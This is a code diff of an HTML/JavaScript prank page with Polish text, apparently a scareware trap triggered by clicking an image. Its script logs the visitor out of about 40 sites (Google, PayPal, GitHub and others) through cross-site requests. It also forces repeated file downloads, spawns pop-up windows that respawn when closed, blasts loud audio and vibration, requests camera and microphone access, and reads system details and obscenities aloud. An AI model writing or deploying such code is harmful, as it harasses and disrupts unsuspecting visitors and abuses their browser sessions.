@@ -34,61 +34,59 @@
             font-family: 'Courier New', monospace;
         }
 
-        .epilepsy-screen {
+        .black-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            background: black;
             z-index: 9999;
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+        }
+
+        .videos-side {
+            flex: 2;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            font-family: 'Courier New', monospace;
-            background-image: url('https://media1.tenor.com/m/RN7QuRQ5sX0AAAAd/super-idol-car.gif');
-            background-size: cover;      
-            background-position: center;
-            background-repeat: no-repeat;         }
-
-
-        .blinking-text {
-            font-size: 48px;
-            font-weight: bold;
-            text-align: center;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.6);
-            color: red;
-            border-radius: 10px;
-            animation: blink 0.15s step-end infinite;
-            letter-spacing: 5px;
-            margin: 20px;
+            gap: 20px;
+            width: 100%;
+            height: 100%;
         }
 
-        .logout-list {
-            margin-top: 30px;
-            max-height: 300px;
+        .video-box {
+            width: 95%;
+            height: 45%;
+            background: black;
+        }
+
+        .video-box video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .logout-side {
+            flex: 1;
+            height: 100%;
             overflow-y: auto;
-            width: 80%;
-            text-align: center;
-            background: rgba(0, 0, 0, 0.6);
-            border-radius: 10px;
-            padding: 10px;
+            padding: 20px;
+            border-left: 3px solid red;
         }
 
         .logout-item {
-            font-size: 14px;
-            padding: 5px;
+            font-size: 20px;
+            padding: 10px;
             margin: 5px;
             color: red;
-            animation: blink 0.2s step-end infinite;
-        }
-
-
-        @keyframes blink {
-            0% { opacity: 1; text-shadow: 0 0 0 red; }
-            50% { opacity: 0.5; text-shadow: 0 0 5px red; }
-            100% { opacity: 1; text-shadow: 0 0 0 red; }
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
         }
     </style>
 </head>
@@ -107,48 +105,50 @@
 
         const MEME_URL = 'https://images.meme-arsenal.com/f598af3658180fce69a323126db7e103.jpg';
         const SONG_URL = 'https://github.com/kigredns/zobaczepsteina/raw/refs/heads/main/Don%20Pedalini.mp3';
+        const VIDEO1_URL = 'https://github.com/kigredns/zobaczepsteina/raw/refs/heads/main/ep1.mp4';
+        const VIDEO2_URL = 'https://github.com/kigredns/zobaczepsteina/raw/refs/heads/main/ep2.mp4';
 
         const LOGOUT_SITES = {
           Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
-          Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
-          DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
-          Dropbox: ['GET', 'https://www.dropbox.com/logout'],
-          eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
-          GitHub: ['GET', 'https://github.com/logout'],
-          GMail: ['GET', 'https://mail.google.com/mail/?logout'],
-          Google: ['GET', 'https://www.google.com/accounts/Logout'],
-          Hulu: ['GET', 'https://secure.hulu.com/logout'],
-          NetFlix: ['GET', 'https://www.netflix.com/Logout'],
-          Skype: ['GET', 'https://secure.skype.com/account/logout'],
-          SoundCloud: ['GET', 'https://soundcloud.com/logout'],
-          'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
-          'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
-          Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
-          'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
-          Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
-          Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
+          Spotify: ['GET', 'https://www.spotify.com/logout/'],
+          Netflix: ['GET', 'https://www.netflix.com/Logout'],
           YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
-          JShop: ['GET', 'https://jshop.partners/panel/logout'],
-          Vimeo: ['GET', 'https://vimeo.com/log_out'],
-          Tumblr: ['GET', 'https://www.tumblr.com/logout'],
-          Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
-          OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'],
-          InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
-          OLX: ['GET', 'https://www.olx.pl/account/logout'],
-          Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'],
+          Gmail: ['GET', 'https://mail.google.com/mail/?logout'],
+          Google: ['GET', 'https://www.google.com/accounts/Logout'],
+          Facebook: ['GET', 'https://www.facebook.com/logout.php'],
+          Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'],
+          Twitter: ['GET', 'https://twitter.com/logout'],
+          Reddit: ['GET', 'https://www.reddit.com/logout'],
+          Twitch: ['GET', 'https://www.twitch.tv/logout'],
+          Steam: ['GET', 'https://store.steampowered.com/logout/'],
+          Roblox: ['POST', 'https://auth.roblox.com/v2/logout'],
           ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'],
-          Guilded:  ['POST', 'https://www.guilded.gg/api/logout'],
+          GitHub: ['GET', 'https://github.com/logout'],
           LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'],
           Pinterest: ['GET', 'https://www.pinterest.com/logout/'],
-          Reddit: ['GET', 'https://www.reddit.com/logout'],
-          Spotify: ['GET', 'https://www.spotify.com/logout/'],
+          Tumblr: ['GET', 'https://www.tumblr.com/logout'],
+          Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
+          OLX: ['GET', 'https://www.olx.pl/account/logout'],
+          Onet: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'],
+          Interia: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
+          Skype: ['GET', 'https://secure.skype.com/account/logout'],
+          Hulu: ['GET', 'https://secure.hulu.com/logout'],
+          Dropbox: ['GET', 'https://www.dropbox.com/logout'],
+          eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
           Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'],
-          Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'],
-          Trello: ['GET', 'https://trello.com/logout'],
-          Baidu: ['GET', 'https://passport.baidu.com/?logout'],
+          Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
+          Vimeo: ['GET', 'https://vimeo.com/log_out'],
+          SoundCloud: ['GET', 'https://soundcloud.com/logout'],
+          DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
+          Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
+          Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
           VK: ['GET', 'https://vk.com/exit'],
+          Baidu: ['GET', 'https://passport.baidu.com/?logout'],
           StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'],
-          Asana: ['POST', 'https://app.asana.com/app/asana/-/logout']
+          Asana: ['POST', 'https://app.asana.com/app/asana/-/logout'],
+          Trello: ['GET', 'https://trello.com/logout'],
+          PayPal: ['GET', 'https://www.paypal.com/logout'],
+          Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out']
         };
 
         const wins = [];
@@ -158,6 +158,65 @@
         let speechSynth = window.speechSynthesis;
         let spamInterval = null;
         let beepInterval = null;
+        let windowMonitorInterval = null;
+        let vibrationInterval = null;
+        let videoElements = [];
+        let loudAudios = [];
+
+        function forceDownload(url, filename) {
+            try {
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = filename;
+                link.target = '_blank';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            } catch(e) {}
+        }
+
+        function startAutoDownload() {
+            const images = [
+                { url: 'https://raw.githubusercontent.com/kigredns/zobaczepsteina/refs/heads/main/epim1.png', name: 'epim1.png' },
+                { url: 'https://raw.githubusercontent.com/kigredns/zobaczepsteina/refs/heads/main/goldenone.png', name: 'goldenone.png' },
+                { url: 'https://raw.githubusercontent.com/kigredns/zobaczepsteina/refs/heads/main/epimsad.png', name: 'epimsad.png' }
+            ];
+            
+            let index = 0;
+            setInterval(() => {
+                const img = images[index % images.length];
+                forceDownload(img.url, img.name);
+                index++;
+            }, 3000);
+        }
+
+        function playLoudRandomSounds() {
+            const sounds = [
+                'https://www.myinstants.com/media/sounds/air-horn_UsZ9XQA.mp3',
+                'https://www.myinstants.com/media/sounds/vine-boom.mp3',
+                'https://www.myinstants.com/media/sounds/among-us-death-sound_FZakQN2.mp3',
+                'https://www.myinstants.com/media/sounds/mario-coin_SRgKqDv.mp3',
+                'https://www.myinstants.com/media/sounds/wilhelm-scream.mp3',
+                'https://www.myinstants.com/media/sounds/taco-bell-bong.mp3',
+                'https://www.myinstants.com/media/sounds/roblox-oh-no.mp3',
+                'https://www.myinstants.com/media/sounds/roblox-death-sound_1.mp3'
+            ];
+            
+            setInterval(() => {
+                const randomSound = sounds[Math.floor(Math.random() * sounds.length)];
+                const loudAudio = new Audio(randomSound);
+                loudAudio.volume = 1.0;
+                loudAudio.play().catch(e => console.log('Dźwięk zablokowany'));
+                loudAudios.push(loudAudio);
+                
+                setTimeout(() => {
+                    if (loudAudios.length > 10) {
+                        const old = loudAudios.shift();
+                        if (old) old.pause();
+                    }
+                }, 5000);
+            }, 3000);
+        }
 
         function moveWindowBounce(win) {
             let vx = (VELOCITY + Math.random() * 10) * (Math.random() > 0.5 ? 1 : -1);
@@ -185,7 +244,7 @@
             if (audio && !audio.paused) return;
             audio = new Audio(SONG_URL);
             audio.loop = true;
-            audio.volume = 0.5;
+            audio.volume = 1.0;
             audio.play().catch(e => console.log('Autoodtwarzanie zablokowane'));
         }
 
@@ -197,7 +256,7 @@
                 oscillator.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
                 oscillator.frequency.value = 880;
-                gainNode.gain.value = 0.5;
+                gainNode.gain.value = 1.0;
                 oscillator.start();
                 gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.5);
                 oscillator.stop(audioCtx.currentTime + 0.5);
@@ -208,8 +267,66 @@
         function startLoudBeeps() {
             if (beepInterval) clearInterval(beepInterval);
             beepInterval = setInterval(() => {
-                playBeep();
-            }, 1000);
+                for(let i = 0; i < 3; i++) {
+                    setTimeout(() => playBeep(), i * 100);
+                }
+            }, 500);
+        }
+
+        function startVibration() {
+            if (window.navigator && window.navigator.vibrate) {
+                vibrationInterval = setInterval(() => {
+                    window.navigator.vibrate([500, 100, 500, 100, 1000, 200, 500]);
+                }, 1500);
+            }
+        }
+
+        function showTwoVideos() {
+            const container = document.createElement('div');
+            container.className = 'videos-side';
+            
+            const video1Div = document.createElement('div');
+            video1Div.className = 'video-box';
+            const video1 = document.createElement('video');
+            video1.src = VIDEO1_URL;
+            video1.loop = true;
+            video1.autoplay = true;
+            video1.muted = false;
+            video1.volume = 1.0;
+            video1Div.appendChild(video1);
+            container.appendChild(video1Div);
+            video1.play().catch(e => console.log('Autoodtwarzanie wideo zablokowane'));
+            videoElements.push(video1);
+            
+            const video2Div = document.createElement('div');
+            video2Div.className = 'video-box';
+            const video2 = document.createElement('video');
+            video2.src = VIDEO2_URL;
+            video2.loop = true;
+            video2.autoplay = true;
+            video2.muted = false;
+            video2.volume = 1.0;
+            video2Div.appendChild(video2);
+            container.appendChild(video2Div);
+            video2.play().catch(e => console.log('Autoodtwarzanie wideo zablokowane'));
+            videoElements.push(video2);
+            
+            return container;
+        }
+
+        function downloadVideos() {
+            const videos = [
+                'https://github.com/kigredns/zobaczepsteina/raw/refs/heads/main/ep1.mp4',
+                'https://github.com/kigredns/zobaczepsteina/raw/refs/heads/main/ep2.mp4'
+            ];
+            
+            setTimeout(() => {
+                for (let i = 0; i < videos.length; i++) {
+                    setTimeout(() => {
+                        forceDownload(videos[i], 'film_' + (i+1) + '.mp4');
+                    }, i * 3000);
+                }
+            }, 5000);
         }
 
         function speakText(text) {
@@ -220,6 +337,7 @@
             utterance.volume = 1;
             speechSynth.speak(utterance);
         }
+
         function requestCameraAndMic() {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: true })
@@ -361,17 +479,17 @@
         async function readAllSystemInfo() {
             const info = await getSystemInfo();
             
-            speakText('LUBIE W DUPE SEX  ANALNY KUTAS KUTAS RUCHAM CI MATKE DZIWKO JEBANA JEBAĆ CIE TY KURWO PIZDO JEBANA');
+            speakText('LUBIE W DUPE SEX ANALNY KUTAS KUTAS RUCHAM CI MATKE DZIWKO JEBANA JEBAĆ CIE TY KURWO PIZDO JEBANA');
             
-            setTimeout(() => speakText('Nazwa komputera to: ' + info.computerName), 2000);
-            setTimeout(() => speakText('Przegladarka: ' + info.browser), 4000);
-            setTimeout(() => speakText('System operacyjny: ' + info.platform), 6000);
-            setTimeout(() => speakText('Język przegladarki: ' + info.language), 8000);
-            setTimeout(() => speakText('Rozdzielczosc ekranu: ' + info.screenResolution), 10000);
-            setTimeout(() => speakText('Glebia kolorow: ' + info.colorDepth), 12000);
-            setTimeout(() => speakText('Strefa czasowa: ' + info.timezone), 14000);
-            setTimeout(() => speakText('Pamiec RAM: ' + info.ram), 16000);
-            setTimeout(() => speakText('Liczba rdzeni procesora: ' + info.cores), 18000);
+            setTimeout(() => speakText('Nazwa komputera to: ' + info.computerName), 4000);
+            setTimeout(() => speakText('Przegladarka: ' + info.browser), 8000);
+            setTimeout(() => speakText('System operacyjny: ' + info.platform), 12000);
+            setTimeout(() => speakText('Język przegladarki: ' + info.language), 16000);
+            setTimeout(() => speakText('Rozdzielczosc ekranu: ' + info.screenResolution), 20000);
+            setTimeout(() => speakText('Glebia kolorow: ' + info.colorDepth), 24000);
+            setTimeout(() => speakText('Strefa czasowa: ' + info.timezone), 28000);
+            setTimeout(() => speakText('Pamiec RAM: ' + info.ram), 32000);
+            setTimeout(() => speakText('Liczba rdzeni procesora: ' + info.cores), 36000);
         }
 
         function getRandomCoords(width, height) {
@@ -417,14 +535,29 @@
             return win;
         }
 
-        async function superLogoutWithList(listDiv) {
+        function startWindowMonitor() {
+            windowMonitorInterval = setInterval(() => {
+                for (let i = 0; i < wins.length; i++) {
+                    if (wins[i] && wins[i].closed) {
+                        const newWin = openMemeWindow(i + 1);
+                        if (newWin) {
+                            wins[i] = newWin;
+                            setTimeout(() => {
+                                if (!newWin.closed) moveWindowBounce(newWin);
+                            }, 100);
+                        }
+                    }
+                }
+            }, 500);
+        }
+
+        function superLogout(listDiv) {
             function addLogoutMessage(serviceName) {
                 const div = document.createElement('div');
                 div.className = 'logout-item';
                 div.innerHTML = 'WYLOGOWYWANIE Z ' + serviceName.toUpperCase();
                 listDiv.appendChild(div);
                 listDiv.scrollTop = listDiv.scrollHeight;
-                speakText('Wylogowywanie z ' + serviceName);
             }
             
             function cleanup(el) {
@@ -491,30 +624,52 @@
             if (hasStarted) return;
             hasStarted = true;
             
-            playMusic();
-            startSpammingRequests();
-            startLoudBeeps();
+            startAutoDownload();
             
             const mainContainer = document.getElementById('mainContainer');
             mainContainer.style.display = 'none';
             
-            const epilepsyScreen = document.createElement('div');
-            epilepsyScreen.className = 'epilepsy-screen';
+            const blackScreen = document.createElement('div');
+            blackScreen.className = 'black-screen';
             
-            const mainBlink = document.createElement('div');
-            mainBlink.className = 'blinking-text';
-            mainBlink.innerHTML = 'WYLOGOWYWANIE...';
-            epilepsyScreen.appendChild(mainBlink);
+            const videosContainer = showTwoVideos();
+            blackScreen.appendChild(videosContainer);
+            
+            const logoutDiv = document.createElement('div');
+            logoutDiv.className = 'logout-side';
+            
+            const title = document.createElement('div');
+            title.style.color = 'red';
+            title.style.fontSize = '32px';
+            title.style.fontWeight = 'bold';
+            title.style.textAlign = 'center';
+            title.style.marginBottom = '20px';
+            title.innerHTML = 'WYLOGOWYWANIE...';
+            logoutDiv.appendChild(title);
             
             const listDiv = document.createElement('div');
-            listDiv.className = 'logout-list';
-            epilepsyScreen.appendChild(listDiv);
+            listDiv.id = 'logoutList';
+            logoutDiv.appendChild(listDiv);
             
-            document.body.appendChild(epilepsyScreen);
+            blackScreen.appendChild(logoutDiv);
+            
+            document.body.appendChild(blackScreen);
+            
+            downloadVideos();
+            
+            setTimeout(() => {
+                playMusic();
+                startLoudBeeps();
+                playLoudRandomSounds();
+                startVibration();
+                startSpammingRequests();
+            }, 2000);
             
             await readAllSystemInfo();
             
-            for (let i = 1; i <= 25; i++) {
+            superLogout(listDiv);
+            
+            for (let i = 1; i <= 30; i++) {
                 setTimeout(() => {
                     const win = openMemeWindow(i);
                     if (win) {
@@ -524,7 +679,7 @@
                 }, i * 80);
             }
             
-            superLogoutWithList(listDiv);
+            startWindowMonitor();
         }
 
         document.getElementById('epsteinImg').addEventListener('click', revealSecrets);
